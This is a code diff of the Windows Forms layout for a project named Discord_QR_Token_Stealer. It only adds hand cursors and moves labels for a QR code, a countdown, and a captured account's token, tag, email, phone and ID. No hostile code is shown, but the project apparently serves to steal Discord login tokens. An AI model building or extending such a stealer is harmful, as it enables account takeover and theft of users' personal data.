@@ -87,7 +87,8 @@ namespace Discord_QR_Token_Stealer
             // lblToken
             // 
             this.lblToken.Anchor = System.Windows.Forms.AnchorStyles.Left;
-            this.lblToken.Location = new System.Drawing.Point(12, 628);
+            this.lblToken.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.lblToken.Location = new System.Drawing.Point(12, 599);
             this.lblToken.Name = "lblToken";
             this.lblToken.Size = new System.Drawing.Size(329, 17);
             this.lblToken.TabIndex = 5;
@@ -98,7 +99,8 @@ namespace Discord_QR_Token_Stealer
             // lblTag
             // 
             this.lblTag.Anchor = System.Windows.Forms.AnchorStyles.Left;
-            this.lblTag.Location = new System.Drawing.Point(12, 662);
+            this.lblTag.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.lblTag.Location = new System.Drawing.Point(12, 633);
             this.lblTag.Name = "lblTag";
             this.lblTag.Size = new System.Drawing.Size(329, 17);
             this.lblTag.TabIndex = 6;
@@ -109,7 +111,8 @@ namespace Discord_QR_Token_Stealer
             // lblEmail
             // 
             this.lblEmail.Anchor = System.Windows.Forms.AnchorStyles.Left;
-            this.lblEmail.Location = new System.Drawing.Point(12, 679);
+            this.lblEmail.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.lblEmail.Location = new System.Drawing.Point(12, 650);
             this.lblEmail.Name = "lblEmail";
             this.lblEmail.Size = new System.Drawing.Size(329, 17);
             this.lblEmail.TabIndex = 7;
@@ -120,7 +123,8 @@ namespace Discord_QR_Token_Stealer
             // lblPhone
             // 
             this.lblPhone.Anchor = System.Windows.Forms.AnchorStyles.Left;
-            this.lblPhone.Location = new System.Drawing.Point(12, 696);
+            this.lblPhone.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.lblPhone.Location = new System.Drawing.Point(12, 667);
             this.lblPhone.Name = "lblPhone";
             this.lblPhone.Size = new System.Drawing.Size(329, 17);
             this.lblPhone.TabIndex = 8;
@@ -131,7 +135,8 @@ namespace Discord_QR_Token_Stealer
             // lblId
             // 
             this.lblId.Anchor = System.Windows.Forms.AnchorStyles.Left;
-            this.lblId.Location = new System.Drawing.Point(12, 645);
+            this.lblId.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.lblId.Location = new System.Drawing.Point(12, 616);
             this.lblId.Name = "lblId";
             this.lblId.Size = new System.Drawing.Size(329, 17);
             this.lblId.TabIndex = 9;
@@ -142,7 +147,7 @@ namespace Discord_QR_Token_Stealer
             // lblTimeLeft
             // 
             this.lblTimeLeft.Anchor = System.Windows.Forms.AnchorStyles.Left;
-            this.lblTimeLeft.Location = new System.Drawing.Point(12, 50);
+            this.lblTimeLeft.Location = new System.Drawing.Point(12, 32);
             this.lblTimeLeft.Name = "lblTimeLeft";
             this.lblTimeLeft.Size = new System.Drawing.Size(329, 23);
             this.lblTimeLeft.TabIndex = 10;
@@ -177,7 +182,7 @@ namespace Discord_QR_Token_Stealer
             // 
             this.currentCode.Anchor = System.Windows.Forms.AnchorStyles.Left;
             this.currentCode.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
-            this.currentCode.Location = new System.Drawing.Point(12, 76);
+            this.currentCode.Location = new System.Drawing.Point(12, 58);
             this.currentCode.Name = "currentCode";
             this.currentCode.Size = new System.Drawing.Size(329, 497);
             this.currentCode.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
